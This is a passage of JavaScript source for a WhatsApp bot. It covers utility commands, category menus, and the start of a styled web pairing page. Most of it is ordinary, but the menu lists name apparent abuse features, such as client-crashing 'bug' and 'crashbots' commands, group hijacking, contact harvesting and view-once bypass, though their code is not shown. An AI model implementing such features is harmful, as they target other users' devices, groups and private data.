  else await style.reply(sock, sender, cap, msg);
}};

builtInCommands.avatar = { desc: '🖼️ Avatar from name', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .avatar <name>'), msg);
  await style.react(sock, sender, msg, '🖼️');
  const name = args.join(' ');
  await sock.sendMessage(sender, { image: { url: `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&size=512&background=random` }, caption: `🖼️ Avatar: ${name}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.trivia = { desc: '🎯 Trivia question', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🎯');
  try {
    const r = await axios.get('https://opentdb.com/api.php?amount=1&type=multiple', { timeout: 10000 });
    const q = r.data.results[0];
    const correct = q.correct_answer;
    const answers = [...q.incorrect_answers, correct].sort(() => Math.random() - 0.5);
    const L = ['A', 'B', 'C', 'D'];
    const dec = s => s.replace(/&quot;/g,'"').replace(/&#039;/g,"'").replace(/&amp;/g,'&');
    const cap = `🎯 *TRIVIA*\n\n${dec(q.question)}\n\n${answers.map((a, i) => `${L[i]}. ${dec(a)}`).join('\n')}\n\nCategory: ${q.category} • Difficulty: ${q.difficulty}`;
    await style.reply(sock, sender, cap, msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.urlinfo = { desc: '🌐 URL info', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .urlinfo <url>'), msg);
  await style.react(sock, sender, msg, '🌐');
  try {
    const url = args[0].startsWith('http') ? args[0] : 'https://' + args[0];
    const r = await axios.get(url, { timeout: 10000, headers: { 'User-Agent': 'Mozilla/5.0' }, maxRedirects: 3 });
    const title = (r.data.match?.(/<title[^>]*>([^<]+)<\/title>/i) || [])[1] || 'No title';
    const desc = (r.data.match?.(/<meta[^>]*name=["']description["'][^>]*content=["']([^"']+)/i) || [])[1] || 'No description';
    await style.reply(sock, sender, style.box('🌐 URL INFO', `${style.kv('URL', url)}\n${style.kv('Status', r.status)}\n${style.kv('Title', title)}\n${style.kv('Desc', desc.substring(0, 200))}`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.idgen = { desc: '🆔 ID generator', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🆔');
  const type = (args[0] || 'uuid').toLowerCase();
  let id;
  if (type === 'pin') id = String(Math.floor(100000 + Math.random() * 900000));
  else if (type === 'id') id = 'ID-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 8).toUpperCase();
  else id = crypto.randomUUID();
  await style.reply(sock, sender, style.box('🆔 GENERATED', id), msg);
}};

builtInCommands.heart = { desc: '❤️ Heart animation', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '❤️');
  const em = args[0] || '❤️';
  const frames = ['❤️','💛','💚','💙','💜','🖤','🤍','🤎'];
  let m = await sock.sendMessage(sender, { text: em }, { quoted: msg });
  for (let i = 0; i < 8; i++) { await delay(300); try { await sock.sendMessage(sender, { text: em.repeat(i + 2) + '\n' + frames[i % frames.length], edit: m.key }); } catch(e) { break; } }
}};

builtInCommands.stickerpack = { desc: '📦 Sticker info', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.stickerMessage && !q?.stickerMessage) return style.reply(sock, sender, style.error('Reply to sticker.'), msg);
  await style.react(sock, sender, msg, '📦');
  try {
    const s = msg.message?.stickerMessage || q?.stickerMessage;
    await style.reply(sock, sender, style.box('📦 STICKER', `${style.kv('Animated', s.isAnimated ? 'Yes' : 'No')}\n${style.kv('Mimetype', s.mimetype)}\n${style.kv('Size', (s.fileLength || 0) + ' bytes')}`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.spam = { desc: '📨 Spam text (careful!)', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .spam <count> <text>'), msg);
  const count = Math.min(Math.max(parseInt(args[0]) || 1, 1), 20);
  const text = args.slice(1).join(' ');
  await style.react(sock, sender, msg, '📨');
  for (let i = 0; i < count; i++) { await delay(500); try { await sock.sendMessage(sender, { text: `${text} [${i + 1}/${count}]` }); } catch(e) { break; } }
}};

builtInCommands.dig = { desc: '🔍 DNS lookup', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .dig <domain>'), msg);
  await style.react(sock, sender, msg, '🔍');
  try {
    const r = await axios.get(`https://dns.google/resolve?name=${encodeURIComponent(args[0])}&type=A`, { timeout: 10000 });
    const answers = (r.data.Answer || []).map(a => `> ${a.name} → ${a.data}`).join('\n') || 'None.';
    await style.reply(sock, sender, style.box('🔍 DNS', answers), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.headers = { desc: '📋 HTTP headers', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .headers <url>'), msg);
  await style.react(sock, sender, msg, '📋');
  try {
    const url = args[0].startsWith('http') ? args[0] : 'https://' + args[0];
    const r = await axios.head(url, { timeout: 10000, headers: { 'User-Agent': 'Mozilla/5.0' } });
    const h = Object.entries(r.headers).slice(0, 15).map(([k, v]) => `> ${k}: ${String(v).substring(0, 100)}`).join('\n');
    await style.reply(sock, sender, style.box('📋 HEADERS', h), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

/* ═══════════════════════════════════════════════════════════════════════
   MENUS
   ═══════════════════════════════════════════════════════════════════════ */
const MENUS = {
  1: { title: 'Core System', emoji: '🤖', cmds: ['alive', 'ping', 'speed', 'stats', 'uptime', 'lastseen', 'repo', 'script', 'source', 'owner', 'developer', 'getowner', 'sysinfo', 'debugchat', 'report', 'menu', 'help', 'allmenu'] },
  2: { title: 'Downloads', emoji: '📥', cmds: ['play', 'song', 'songs', 'music', 'yta', 'video', 'ytvideo', 'ytv', 'ytmp4', 'ytvid', 'facebook', 'fb', 'ig', 'insta', 'tt', 'twitter', 'x', 'reddit', 'soundcloud', 'spotify', 'pinterest', 'yts', 'tourl', 'apk', 'app', 'mediafire', 'ytmp3', 'tiktokaudio', 'tta', 'capcut', 'pindl', 'twitteraudio', 'xa', 'spotifydl', 'spdl', 'soundclouddl', 'scdl', 'vimeo', 'dailymotion', 'dm', 'twitch', 'redditaudio', 'ra', 'mega', 'song2', 'video2', 'shazam', 'ttsearch', 'ytdl', 'ytmp4hd', 'igdl', 'fbhd'] },
  3: { title: 'AI & Image', emoji: '🧠', cmds: ['ai', 'gpt', 'gpt3', 'gpt4', 'openai', 'metaai', 'wormgpt', 'codeai', 'triviaai', 'gemini', 'image', 'photoai', 'realistic', 'flux', 'nanobanana', 'createlogo', 'stickerai', 'wiki', 'define', 'lyrics', 'wallpaper', 'translate', 'tr', 'ocr', 'gimg', 'gimage'] },
  4: { title: 'Group Management', emoji: '👥', cmds: ['tagall', 'hidetag', 'gci', 'groupinfo', 'kick', 'add', 'promote', 'demote', 'join', 'leave', 'close', 'open', 'grouplink', 'revoke', 'setname', 'setdesc', 'prctme', 'safety', 'warn', 'warnings', 'resetwarn', 'mute', 'unmute', 'poll', 'poll2', 'setwelcome', 'setgoodbye', 'clearwelcome', 'kickall', 'demandlock', 'demandunlock', 'godmode', 'grouphijack', 'botcage', 'setgpp', 'invite', 'members', 'adminlist', 'onlyadmins', 'unlockgroup', 'lockgroup', 'groupstats', 'statsgroup', 'statstoday', 'statsweek', 'removeinactive', 'addall', 'masskick', 'welcome', 'goodbye', 'gcstatus', 'tagadmins', 'getgcicon', 'grouprules', 'setrules'] },
  5: { title: 'Privacy & Automation', emoji: '🔒', cmds: ['antilink', 'antibot', 'antidelete', 'anticall', 'antileave', 'antibadword', 'antiimage', 'antistatusmention', 'antispam', 'antiviewonce', 'antipromote', 'antidemote', 'antiraid', 'autotyping', 'autoreact', 'autostatusview', 'autoreply', 'aidm', 'autobot', 'slowmode', 'fastmode', 'voicereply', 'autoread', 'autoreadstatus', 'antionline', 'antiupdate', 'onlyadmin', 'silent', 'dnd', 'away', 'back'] },
  6: { title: 'Utilities & Info', emoji: '🛠️', cmds: ['calc', 'calc2', 'percentage', 'currency', 'genpass', 'horoscope', 'qc', 'recipe', 'remind', 'sciencefact', 'book', 'readmore', 'weather', 'forecast', 'weatherforecast', 'temp', 'wind', 'humidity', 'uv', 'tts', 'time', 'countdown', 'age', 'bmi', 'unit', 'base64', 'unbase64', 'hash', 'uuid', 'random', 'pick', 'binary', 'binary2', 'hex', 'unhex', 'rot13', 'caesar', 'morse', 'unmorse', 'shorturl', 'qrcodegen', 'qr', 'whois', 'trace', 'find', 'iplookup', 'myip', 'jid', 'idch', 'crypto', 'cryptolist', 'stock', 'news', 'movie', 'imdb', 'anime', 'manga', 'github', 'gh', 'npm', 'country', 'iss', 'earthquake', 'nasa', 'ssweb', 'screenshot', 'svweb', 'vidweb', 'webmp4', 'paste', 'vowelcount', 'reversetext', 'upper', 'lower', 'palindrome', 'wordcount', 'flip', 'currencylist', 'ascii', 'binlookup', 'ifsc', 'pincode', 'emailvalid', 'phoneinfo', 'urlexpand', 'fakeuser', 'tvshow', 'tweet', 'typing', 'vcard', 'location', 'avatar', 'trivia', 'urlinfo', 'idgen', 'dig', 'headers'] },
  7: { title: 'Fun & Games', emoji: '🎮', cmds: ['joke', '8ball', 'quote', 'fact', 'roll', 'coinflip', 'slot', 'rps', 'truth', 'dare', 'wyr', 'ship', 'compliment', 'roast', 'verse', 'pray', 'did you know', 'something i dont know', 'nba', 'fifa', 'football', 'hockey', 'alien news', 'ufo', 'scan aliens', 'area 61', 'year anime info', 'download anime', 'cat', 'dog', 'meme', 'advice', 'dadjoke', 'randomfact', 'waifu', 'neko', 'emojimix', 'attp', 'heart'] },
  8: { title: 'Media & Sonic', emoji: '🎨', cmds: ['sticker', 's', 'simg', 'toimg', 'blur', 'grayscale', 'invert', 'removebg', 'img', 'say', 'font', 'rvo', 'save', 'vv', 'vv2', 'vv3', 'bass', 'blown', 'earrape', 'deep', 'slow', 'fast', 'robot', 'nightcore', 'smooth', 'squirrel', 'reverse', 'del', 'boost', 'memory', 'cpu', 'disk', 'togif', 'voice', 'resize', 'rotate', 'stickerpack'] },
  9: { title: 'Owner & Privileged', emoji: '👑', cmds: ['fullpp', 'setpp', 'delpp', 'getpp', 'block', 'unblock', 'bug', 'crashbots', 'summon', 'selfdestruct', 'reboot', 'wipe', 'hack bot info', 'take gc contacts', 'broadcast', 'setprefix', 'mode', 'owneronly', 'addsudo', 'delsudo', 'sudos', 'reload', 'backup', 'eval', 'crash', 'restart', 'xdelay', 'report', 'spam'] },
  10: { title: 'Pairing & Notes', emoji: '🔗', cmds: ['pair', 'pairlink', 'listpairs', 'deletepair', 'restartpair', 'sendpair', 'stopallpairs', 'setchannel', '1000reactions', 'resetchannel', 'code html', 'code js', 'code python', 'code cc+', 'note', 'notes', 'delnote', 'clearnotes', 'todo', 'todos', 'donetodo', 'deltodo', 'cleartodos', 'me', 'whoami'] }
};
const TOTAL_MENUS = Object.keys(MENUS).length;

function buildMenuText(n, sock, sender) {
  const cfg = MENUS[n]; if (!cfg) return null;
  const all = { ...builtInCommands, ...plugins };
  const rt = getRuntime(sock);
  const prefix = rt.customPrefix || DEFAULT_PREFIX;
  const up = Math.floor((Date.now() - startTime) / 1000);
  const valid = cfg.cmds.filter(c => all[c]);
  let body = `╭━━━𓆩『${cfg.emoji}』${fonts.bold(cfg.title.toUpperCase())}𓆪━━━╮\n`;
  body += `> ${GLYPH.rune} *USER:* @${sender.split('@')[0]}\n`;
  body += `> ${GLYPH.rune} *MENU:* ${n}/${TOTAL_MENUS}\n`;
  body += `> ${GLYPH.rune} *PREFIX:* ${prefix}\n`;
  body += `> ${GLYPH.rune} *OWNER:* ${OWNER_NAME}\n`;
  body += `> ${GLYPH.rune} *UPTIME:* ${runtime(up)}\n`;
  body += `╰━━━━━━━━━━━𓆩𓆣𓆪\n\n📋 *COMMANDS*\n`;
  valid.forEach(c => { body += `> 𓊅 ${prefix}${c}\n`; });
  body += `\n_Total: ${valid.length} commands_\n\n`;
  body += `━━━━━━━━━━━━━━━\n📢 *Tap "View Channel" below*`;
  return body;
}

function menuNavButtons(n, prefix) {
  const b = [];
  if (n > 1) b.push({ label: `◀ ${n - 1}`, id: `${prefix}menu${n - 1}` });
  b.push({ label: '🏠 Home', id: `${prefix}menu` });
  if (n < TOTAL_MENUS) b.push({ label: `${n + 1} ▶`, id: `${prefix}menu${n + 1}` });
  return b;
}

Object.keys(MENUS).map(Number).forEach(n => {
  builtInCommands['menu' + n] = { desc: `Menu ${n}: ${MENUS[n].title}`, execute: async (sock, sender, args, msg) => {
    await style.react(sock, sender, msg, MENUS[n].emoji);
    const body = buildMenuText(n, sock, sender);
    if (!body) return style.reply(sock, sender, style.error('Invalid.'), msg);
    const rt = getRuntime(sock);
    const prefix = rt.customPrefix || DEFAULT_PREFIX;
    const sent = await sendButtons(sock, sender, msg, { text: body, footer: `Menu ${n}/${TOTAL_MENUS} • ${BOT_NAME}`, buttons: menuNavButtons(n, prefix), contextInfo: CHANNEL_CONTEXT });
    if (sent?.key?.id) menuMessageTracker.set(sender, sent.key.id);
  }};
});

builtInCommands.menu = builtInCommands.help = {
  desc: '📋 Main menu with category buttons',
  execute: async (sock, sender, args, msg) => {
    if (menuLoadingUsers.has(sender)) return style.reply(sock, sender, style.error('Menu loading...'), msg);
    menuLoadingUsers.add(sender);
    await style.react(sock, sender, msg, '📋');
    try {
      const rt = getRuntime(sock);
      const prefix = rt.customPrefix || DEFAULT_PREFIX;
      const total = Object.keys(builtInCommands).length + Object.keys(plugins).length;
      const up = Math.floor((Date.now() - startTime) / 1000);
      let body = `╭━━━𓆩𓆣』${BOT_NAME}𓆪━━━╮\n`;
      body += `> ${GLYPH.rune} *USER:* @${sender.split('@')[0]}\n`;
      body += `> ${GLYPH.rune} *OWNER:* ${OWNER_NAME}\n`;
      body += `> ${GLYPH.rune} *VERSION:* ${VERSION}\n`;
      body += `> ${GLYPH.rune} *PREFIX:* ${prefix}\n`;
      body += `> ${GLYPH.rune} *UPTIME:* ${runtime(up)}\n`;
      body += `> ${GLYPH.rune} *COMMANDS:* ${total}\n`;
      body += `> ${GLYPH.rune} *BRAIN:* 🧠 ONLINE\n`;
      body += `╰━━━━━━━━━━━𓆩𓆣𓆪\n\n`;
      body += `📋 *SELECT A CATEGORY*\n`;
      body += `Tap a button below, or simply *reply* with \`1\` … \`${TOTAL_MENUS}\`\n\n`;
      for (const k of Object.keys(MENUS).map(Number)) body += `> ${MENUS[k].emoji} *Menu ${k}* — ${MENUS[k].title}\n`;
      body += `\n_Type \`${prefix}allmenu\` for the swipeable carousel._\n\n`;
      body += `━━━━━━━━━━━━━━━\n📢 *Tap "View Channel" below*`;
      const buttons = [
        { label: '1️⃣ Core System', id: `${prefix}menu1` },
        { label: '2️⃣ Downloads', id: `${prefix}menu2` },
        { label: '3️⃣ AI & Image', id: `${prefix}menu3` },
        { label: '4️⃣ Groups', id: `${prefix}menu4` },
        { label: '5️⃣ Privacy', id: `${prefix}menu5` },
        { label: '6️⃣ Utilities', id: `${prefix}menu6` },
        { label: '7️⃣ Fun & Games', id: `${prefix}menu7` },
        { label: '8️⃣ Media', id: `${prefix}menu8` },
        { label: '9️⃣ Owner', id: `${prefix}menu9` },
        { label: '🔟 Pairing', id: `${prefix}menu10` },
        { label: '🎠 Carousel All', id: `${prefix}allmenu` }
      ];
      const sent = await sendButtons(sock, sender, msg, { text: body, footer: `Main Menu • ${TOTAL_MENUS} categories • ${BOT_NAME}`, buttons, contextInfo: CHANNEL_CONTEXT });
      if (sent?.key?.id) menuMessageTracker.set(sender, sent.key.id);
    } catch(e) { console.error('menu:', e.message); }
    finally { menuLoadingUsers.delete(sender); }
  }
};

builtInCommands.allmenu = {
  desc: '🎠 Swipeable carousel of every menu (all at once)',
  execute: async (sock, sender, args, msg) => {
    await style.react(sock, sender, msg, '🎠');
    const rt = getRuntime(sock);
    const prefix = rt.customPrefix || DEFAULT_PREFIX;
    const cards = [];
    for (let n = 1; n <= TOTAL_MENUS; n++) {
      const cfg = MENUS[n]; if (!cfg) continue;
      const all = { ...builtInCommands, ...plugins };
      const valid = cfg.cmds.filter(c => all[c]);
      const up = Math.floor((Date.now() - startTime) / 1000);
      let body = `╭━━━𓆩『${cfg.emoji}』${fonts.bold(cfg.title.toUpperCase())}𓆪━━━╮\n`;
      body += `> ${GLYPH.rune} *USER:* @${sender.split('@')[0]}\n`;
      body += `> ${GLYPH.rune} *MENU:* ${n}/${TOTAL_MENUS}\n`;
      body += `> ${GLYPH.rune} *PREFIX:* ${prefix}\n`;
      body += `> ${GLYPH.rune} *UPTIME:* ${runtime(up)}\n`;
      body += `> ${GLYPH.rune} *COMMANDS:* ${valid.length}\n`;
      body += `╰━━━━━━━━━━━𓆩𓆣𓆪\n\n`;
      body += `📋 *COMMANDS*\n`;
      valid.forEach(c => { body += `> 𓊅 ${prefix}${c}\n`; });
      body += `\n━━━━━━━━━━━━━━━\n📢 *Tap "View Channel" below*`;
      const nav = [{ label: `📂 Open Menu ${n}`, id: `${prefix}menu${n}` }];
      if (n > 1) nav.push({ label: `◀ ${n - 1}`, id: `${prefix}menu${n - 1}` });
      if (n < TOTAL_MENUS) nav.push({ label: `${n + 1} ▶`, id: `${prefix}menu${n + 1}` });
      nav.push({ label: '🏠 Home', id: `${prefix}menu` });
      cards.push({ title: `${cfg.emoji} ${cfg.title}`, body, footer: `${BOT_NAME} • Slide ${n}/${TOTAL_MENUS}`, buttons: nav });
    }
    await sendCarousel(sock, sender, msg, cards, CHANNEL_CONTEXT);
  }
};


/* ═══════════════════════════════════════════════════════════════════════
   PAIRLINK — Web-based pairing via Express
   ═══════════════════════════════════════════════════════════════════════ */
const WEB_PAIR_PORT = parseInt(process.env.PORT) || 3000;
let pairlinkServer = null;

async function getPublicUrl() {
  if (process.env.PUBLIC_URL) return process.env.PUBLIC_URL;
  try {
    const r = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
    if (r.data?.ip) return `http://${r.data.ip}:${WEB_PAIR_PORT}`;
  } catch(e) {}
  try {
    const r = await axios.get('https://ipv4.icanhazip.com/', { timeout: 5000 });
    if (r.data?.trim) return `http://${r.data.trim()}:${WEB_PAIR_PORT}`;
  } catch(e) {}
  return `http://localhost:${WEB_PAIR_PORT}`;
}

const PAIRLINK_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#071a3d">
<title>Pair My Bot — kayseur-mdx</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
:root { --blue: #1597ff; --cyan: #00eaff; --deep: #020817; --card: rgba(7, 25, 58, .72); --border: rgba(0, 204, 255, .25); --text: #f4fbff; --muted: #8faacb; --green: #24ff88; }
body { min-height: 100vh; font-family: Inter, Arial, sans-serif; color: var(--text); background: radial-gradient(circle at 15% 20%, rgba(0, 174, 255, .25), transparent 30%), radial-gradient(circle at 85% 80%, rgba(41, 79, 255, .3), transparent 35%), linear-gradient(135deg, #020817, #06285d 50%, #03152e); overflow-x: hidden; }
.background { position: fixed; inset: 0; z-index: -2; overflow: hidden; }
.orb { position: absolute; border-radius: 50%; filter: blur(2px); animation: float 8s ease-in-out infinite; }
.orb.one { width: 350px; height: 350px; background: rgba(0, 191, 255, .13); top: -100px; left: -80px; }
.orb.two { width: 300px; height: 300px; background: rgba(42, 74, 255, .14); right: -80px; bottom: -80px; animation-delay: 2s; }
.orb.three { width: 180px; height: 180px; background: rgba(0, 238, 255, .08); top: 50%; left: 45%; animation-delay: 4s; }
@keyframes float { 0%,100% { transform: translate(0,0) scale(1); } 50% { transform: translate(20px,-25px) scale(1.08); } }
.grid { position: fixed; inset: 0; z-index: -1; opacity: .14; background-image: linear-gradient(rgba(0,220,255,.18) 1px, transparent 1px), linear-gradient(90deg, rgba(0,220,255,.18) 1px, transparent 1px); background-size: 50px 50px; transform: perspective(500px) rotateX(55deg) scale(1.5); transform-origin: center bottom; }
header { width: min(1200px, 94%); margin: auto; padding: 25px 0; display: flex; align-items: center; justify-content: space-between; }
.logo { display: flex; align-items: center; gap: 12px; font-size: 21px; font-weight: 800; }
.logo-icon { width: 43px; height: 43px; display: grid; place-items: center; border-radius: 14px; background: linear-gradient(135deg, #00c8ff, #2864ff); box-shadow: 0 0 30px rgba(0,210,255,.45); }
.status { display: flex; align-items: center; gap: 8px; padding: 9px 14px; border-radius: 50px; background: rgba(0, 255, 130, .08); border: 1px solid rgba(0,255,130,.2); color: #8dffbf; font-size: 13px; }
.status-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 12px var(--green); animation: pulse 1.5s infinite; }
@keyframes pulse { 50% { opacity: .35; transform: scale(.7); } }
.container { width: min(1200px, 94%); margin: 30px auto 60px; }
.hero { text-align: center; margin-bottom: 38px; }
.hero h1 { font-size: clamp(35px, 6vw, 70px); line-height: 1; letter-spacing: -3px; background: linear-gradient(90deg, #fff, #55dfff, #6e8dff, #fff); background-size: 250% auto; color: transparent; background-clip: text; -webkit-background-clip: text; animation: shine 5s linear infinite; }
@keyframes shine { to { background-position: 250% center; } }
.hero p { margin-top: 16px; color: var(--muted); font-size: 16px; }
.dashboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; margin-bottom: 25px; }
.stat { position: relative; overflow: hidden; padding: 22px; border: 1px solid var(--border); border-radius: 20px; background: var(--card); backdrop-filter: blur(18px); box-shadow: 0 15px 45px rgba(0,0,0,.2); }
.stat::after { content: ""; position: absolute; width: 100px; height: 100px; right: -40px; top: -40px; border-radius: 50%; background: rgba(0,220,255,.12); filter: blur(15px); }
.stat-label { color: var(--muted); font-size: 13px; }
.stat-value { font-size: 30px; font-weight: 800; margin-top: 7px; }
.stat-icon { float: right; font-size: 25px; }
.content { display: grid; grid-template-columns: 1.15fr .85fr; gap: 22px; }
.card { border: 1px solid var(--border); background: var(--card); backdrop-filter: blur(20px); border-radius: 25px; padding: 28px; box-shadow: 0 25px 70px rgba(0,0,0,.25), inset 0 1px rgba(255,255,255,.04); }
.card-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
.card-title h2 { font-size: 21px; }
.card-title span { color: var(--muted); font-size: 12px; }
.anime-area { height: 250px; position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
.aura { position: absolute; width: 190px; height: 190px; border-radius: 50%; background: radial-gradient(circle, rgba(0,225,255,.35), rgba(0,120,255,.12), transparent 70%); animation: aura 3s ease-in-out infinite; }
@keyframes aura { 50% { transform: scale(1.2); opacity: .65; } }
.character { position: relative; width: 135px; height: 180px; animation: characterFloat 4s ease-in-out infinite; }
@keyframes characterFloat { 50% { transform: translateY(-9px); } }
.head { position: absolute; width: 90px; height: 95px; border-radius: 48% 48% 45% 45%; background: linear-gradient(145deg,#ffe0ca,#eaa77f); left: 23px; top: 25px; box-shadow: 0 10px 25px rgba(0,0,0,.25); }
.hair { position: absolute; width: 102px; height: 90px; background: linear-gradient(145deg,#071b42,#103e8d); border-radius: 60% 50% 30% 30%; left: 17px; top: 13px; z-index: 2; clip-path: polygon(0 0, 100% 0, 92% 55%, 75% 35%, 67% 72%, 53% 39%, 40% 78%, 28% 43%, 10% 65%); }
.eye { position: absolute; width: 10px; height: 15px; border-radius: 50%; background: #092a65; top: 65px; z-index: 4; }
.eye.left { left: 43px; }
.eye.right { right: 28px; }
.body { position: absolute; width: 125px; height: 80px; background: linear-gradient(145deg,#0b52aa,#071e52); border-radius: 50px 50px 15px 15px; bottom: 0; left: 5px; box-shadow: 0 12px 30px rgba(0,0,0,.35); }
.scanner { position: absolute; width: 100%; height: 2px; background: #00eaff; top: 0; left: 0; box-shadow: 0 0 15px #00eaff; animation: scan 2s linear infinite; opacity: .6; }
@keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
label { display: block; color: #a8c6e8; font-size: 13px; margin-bottom: 9px; }
.input-wrap { position: relative; }
.input-wrap span { position: absolute; left: 17px; top: 50%; transform: translateY(-50%); font-size: 18px; }
input { width: 100%; padding: 17px 17px 17px 48px; border: 1px solid rgba(76,170,255,.25); outline: none; color: white; background: rgba(0,0,0,.25); border-radius: 15px; font-size: 16px; transition: .25s; }
input:focus { border-color: #00d9ff; box-shadow: 0 0 25px rgba(0,220,255,.13); }
button { width: 100%; margin-top: 15px; border: none; border-radius: 15px; padding: 17px; color: white; font-size: 15px; font-weight: 800; cursor: pointer; background: linear-gradient(135deg,#00aaff,#315cff); box-shadow: 0 12px 30px rgba(0,130,255,.25); transition: .25s; }
button:hover { transform: translateY(-2px); box-shadow: 0 16px 40px rgba(0,160,255,.4); }
button:active { transform: scale(.98); }
button:disabled { opacity: .55; cursor: not-allowed; }
.code-box { display: none; margin-top: 20px; padding: 20px; text-align: center; border-radius: 17px; background: rgba(0,0,0,.25); border: 1px solid rgba(0,225,255,.2); }
.code-box.show { display: block; animation: reveal .5s ease; }
@keyframes reveal { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
.code-label { color: var(--muted); font-size: 12px; margin-bottom: 8px; }
#code { color: #65eaff; font-size: 31px; font-weight: 900; letter-spacing: 7px; text-shadow: 0 0 20px rgba(0,220,255,.6); word-break: break-all; }
.copy-btn { margin-top: 14px; padding: 11px; font-size: 13px; background: rgba(0,200,255,.12); border: 1px solid rgba(0,220,255,.2); box-shadow: none; }
.users { max-height: 390px; overflow-y: auto; }
.user { display: flex; align-items: center; gap: 13px; padding: 14px; margin-bottom: 10px; border-radius: 15px; background: rgba(255,255,255,.035); border: 1px solid rgba(255,255,255,.05); animation: userIn .35s ease; }
@keyframes userIn { from { opacity: 0; transform: translateX(-8px); } }
.avatar { width: 42px; height: 42px; border-radius: 13px; display: grid; place-items: center; background: linear-gradient(135deg,#00aaff,#514dff); font-weight: 900; }
.user-info { flex: 1; }
.user-name { font-weight: 700; font-size: 14px; }
.user-number { color: var(--muted); font-size: 12px; margin-top: 3px; }
.online { width: 9px; height: 9px; background: var(--green); border-radius: 50%; box-shadow: 0 0 10px var(--green); }
.empty { padding: 45px 10px; text-align: center; color: var(--muted); }
.refresh { width: auto; padding: 8px 12px; margin: 0; font-size: 12px; background: rgba(0,180,255,.1); box-shadow: none; }
.toast { position: fixed; right: 22px; bottom: 22px; max-width: 320px; padding: 15px 18px; border-radius: 14px; background: rgba(4,19,44,.92); border: 1px solid rgba(0,220,255,.25); box-shadow: 0 15px 40px rgba(0,0,0,.35); transform: translateY(130px); opacity: 0; transition: .35s; z-index: 99; }
.toast.show { transform: translateY(0); opacity: 1; }
.toast.success { border-color: rgba(36,255,136,.35); }
.toast.error { border-color: rgba(255,70,100,.35); }
@media(max-width: 800px) { header { padding-top: 18px; } .dashboard { grid-template-columns: 1fr; } .content { grid-template-columns: 1fr; } .hero h1 { letter-spacing: -1px; } .card { padding: 20px; } }
@media(max-width: 480px) { .logo span { display: none; } .status { font-size: 11px; } #code { font-size: 23px; } }
</style>
</head>
<body>
<div class="background"><div class="orb one"></div><div class="orb two"></div><div class="orb three"></div><div class="grid"></div></div>
<header>
  <div class="logo"><div class="logo-icon">⚡</div><span>PAIR MY BOT</span></div>
  <div class="status"><div class="status-dot"></div>SYSTEM ONLINE</div>
</header>
<main class="container">
  <section class="hero"><h1>Connect Your Bot</h1><p>Securely pair your WhatsApp number and bring your bot online.</p></section>
  <section class="dashboard">
    <div class="stat"><div class="stat-icon">👥</div><div class="stat-label">Paired Users</div><div class="stat-value" id="totalUsers">0</div></div>
    <div class="stat"><div class="stat-icon">🟢</div><div class="stat-label">System Status</div><div class="stat-value" style="font-size:22px;color:#58ffac">ONLINE</div></div>
    <div class="stat"><div class="stat-icon">⚡</div><div class="stat-label">Pairing Server</div><div class="stat-value" style="font-size:22px">READY</div></div>
  </section>
  <section class="content">
    <div class="card">
      <div class="card-title"><h2>🔗 Pair Your Number</h2><span>SECURE CONNECTION</span></div>
      <div class="anime-area"><div class="aura"></div><div class="character"><div class="hair"></div><div class="head"><div class="eye left"></div><div class="eye right"></div></div><div class="body"></div><div class="scanner"></div></div></div>
      <label for="num">WhatsApp Number</label>
      <div class="input-wrap"><span>📱</span><input id="num" type="tel" inputmode="numeric" autocomplete="tel" placeholder="2"></div>
      <button id="pairBtn" onclick="getCode()">⚡ GENERATE PAIR CODE</button>
      <div class="code-box" id="codeBox"><div class="code-label">YOUR PAIRING CODE</div><div id="code">----</div><button class="copy-btn" onclick="copyCode()">📋 COPY CODE</button></div>
    </div>
    <div class="card">
      <div class="card-title"><h2>👥 Paired Users</h2><button class="refresh" onclick="loadUsers()">↻ Refresh</button></div>
      <div class="users" id="users"><div class="empty"><div style="font-size:35px;margin-bottom:10px">👤</div>Loading paired users...</div></div>
    </div>
  </section>
</main>
<div class="toast" id="toast"></div>
<script>
const $ = id => document.getElementById(id);
function toast(message, type = "success") { const box = $("toast"); box.textContent = message; box.className = "toast show " + type; setTimeout(() => { box.className = "toast"; }, 3000); }
async function getCode() {
  const input = $("num"), button = $("pairBtn"), codeBox = $("codeBox"), code = $("code");
  let num = input.value.trim().replace(/[+\s\-()]/g, "");
  if (!num) { toast("Please enter your WhatsApp number.", "error"); input.focus(); return; }
  if (!/^\d{8,15}$/.test(num)) { toast("Enter a valid international number with country code.", "error"); input.focus(); return; }
  button.disabled = true; button.textContent = "⏳ CONNECTING..."; codeBox.classList.add("show"); code.textContent = "••••••••";
  try {
